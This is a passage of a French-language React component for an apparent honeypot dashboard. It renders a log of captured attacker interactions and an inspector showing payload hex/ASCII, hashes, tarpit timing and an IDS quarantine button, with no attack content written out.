        {/* Lower Split: Capture Queue + Deep Forensic Artifact Inspector */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-4">
          {/* Forensic Capture Log */}
          <div className="lg:col-span-6 border border-slate-200 dark:border-slate-800 rounded-xl divide-y divide-slate-200 dark:divide-slate-800 max-h-[270px] overflow-y-auto">
            {matchingInteractions.length === 0 ? (
              <div className="p-6 text-center text-xs text-slate-500 dark:text-slate-400">
                Aucune interaction malveillante sur cette cellule.
              </div>
            ) : (
              matchingInteractions.slice(0, 14).map((item) => {
                const isSel = inspectedInteraction?.id === item.id;
                const techLabel =
                  TECHNIQUES.find((t) => t.id === item.technique)?.label ||
                  item.technique;
                return (
                  <button
                    key={item.id}
                    type="button"
                    onClick={() => setSelectedInteractionId(item.id)}
                    className={`w-full px-3.5 py-2.5 text-left flex items-center justify-between gap-3 transition-colors cursor-pointer ${
                      isSel
                        ? 'bg-amber-50/70 dark:bg-amber-950/25'
                        : 'hover:bg-slate-50 dark:hover:bg-slate-800/50'
                    }`}
                  >
                    <div className="min-w-0">
                      <div className="flex items-center gap-2 text-xs font-semibold text-slate-900 dark:text-white truncate">
                        <span className="font-mono text-amber-600 dark:text-amber-400">
                          :{item.port}
                        </span>
                        <span>{item.serviceName}</span>
                        <span className="text-slate-400" aria-hidden="true">
                          ·
                        </span>
                        <span className="font-mono text-[11px] text-slate-600 dark:text-slate-300">
                          {item.attackerIp}
                        </span>
                      </div>
                      <div className="text-[11px] font-mono text-slate-500 dark:text-slate-400 truncate mt-0.5">
                        {item.timestamp} · {techLabel} · {item.attackerCountry}
                      </div>
                    </div>

                    <div className="text-right shrink-0 font-mono tabular-nums">
                      <div
                        className={`text-xs font-bold ${
                          item.severity === 'critical'
                            ? 'text-rose-600 dark:text-rose-400'
                            : 'text-amber-600 dark:text-amber-400'
                        }`}
                      >
                        {item.tarpitHoldMs} ms
                      </div>
                      <div className="text-[11px] text-slate-500">
                        {item.bytesCaptured} o
                      </div>
                    </div>
                  </button>
                );
              })
            )}
          </div>

          {/* Forensic Payload & Artifact Inspector */}
          <div className="lg:col-span-6 border border-slate-200 dark:border-slate-800 rounded-xl p-4 bg-slate-50/60 dark:bg-slate-950/50 flex flex-col justify-between gap-3">
            {inspectedInteraction ? (
              <>
                <div className="space-y-3">
                  <div className="flex items-center justify-between gap-2 text-xs">
                    <div className="flex items-center gap-1.5 font-bold text-slate-900 dark:text-white">
                      <FileCode2 className="w-4 h-4 text-amber-500" />
                      <span>
                        Artefact Forensique · Port {inspectedInteraction.port}/
                        {inspectedInteraction.protocol}
                      </span>
                    </div>
                    <span className="font-mono tabular-nums text-[11px] text-slate-500">
                      {inspectedInteraction.timestamp}
                    </span>
                  </div>

                  <div className="grid grid-cols-2 gap-2 text-xs">
                    <div>
                      <span className="text-slate-500 dark:text-slate-400 block text-[11px]">
                        IP Attaquant &amp; ASN
                      </span>
                      <span className="font-mono font-semibold text-rose-600 dark:text-rose-400">
                        {inspectedInteraction.attackerIp}
                      </span>
                      <span className="block text-[11px] text-slate-500 truncate">
                        {inspectedInteraction.attackerCountry} ·{' '}
                        {inspectedInteraction.attackerAsn}
                      </span>
                    </div>
                    <div>
                      <span className="text-slate-500 dark:text-slate-400 block text-[11px]">
                        Empreinte SHA-256 &amp; Rétention
                      </span>
                      <span className="font-mono text-[11px] text-slate-900 dark:text-white truncate block">
                        {inspectedInteraction.artifactSha256}
                      </span>
                      <span className="block text-[11px] font-mono tabular-nums text-amber-600 dark:text-amber-400">
                        Tarpit : {inspectedInteraction.tarpitHoldMs} ms (
                        {inspectedInteraction.bytesCaptured} octets)
                      </span>
                    </div>
                  </div>

                  {/* Hex + ASCII Payload Capture */}
                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 font-mono text-[11px] space-y-1.5">
                    <div className="flex items-center gap-1.5 text-slate-400">
                      <Terminal className="w-3.5 h-3.5 text-cyan-400" />
                      <span>Capture Payload (Hex / ASCII)</span>
                    </div>
                    <div className="text-cyan-300 break-all">
                      {inspectedInteraction.payloadHex}
                    </div>
                    <div className="text-slate-300 whitespace-pre-wrap break-all border-t border-slate-800 pt-1.5">
                      {inspectedInteraction.payloadAscii}
                    </div>
                  </div>
                </div>

                <div className="pt-2 border-t border-slate-200 dark:border-slate-800 flex items-center justify-between gap-2">
                  <span className="text-[11px] text-slate-500 dark:text-slate-400">
                    {isConnected && settings.idsEnabled
                      ? 'Corrélation IDS & Planétarium active'
                      : 'Capture locale en bac à sable'}
                  </span>

                  <button
                    type="button"
                    onClick={() => handleEscalateToIds(inspectedInteraction)}
                    disabled={inspectedInteraction.escalatedToIds}
                    className={`px-3 py-1.5 rounded-lg text-xs font-semibold flex items-center gap-1.5 cursor-pointer transition-colors whitespace-nowrap shrink-0 ${
                      inspectedInteraction.escalatedToIds
                        ? 'bg-emerald-100 dark:bg-emerald-950/50 text-emerald-700 dark:text-emerald-300 cursor-default'
                        : 'bg-rose-600 hover:bg-rose-500 text-white'
                    }`}
                  >
                    {inspectedInteraction.escalatedToIds ? (
                      <>
                        <ShieldCheck className="w-3.5 h-3.5" />
                        <span>Quarantaine IDS active</span>
                      </>
                    ) : (
                      <>
                        <ShieldAlert className="w-3.5 h-3.5" />
                        <span>Quarantaine &amp; IDS</span>
                      </>
                    )}
                  </button>
                </div>
              </>
            ) : (
              <div className="text-xs text-slate-500 py-8 text-center">
                Sélectionnez une capture pour analyser son payload forensique.
              </div>
            )}
          </div>
        </div>
      </div>
    </section>
  );
};
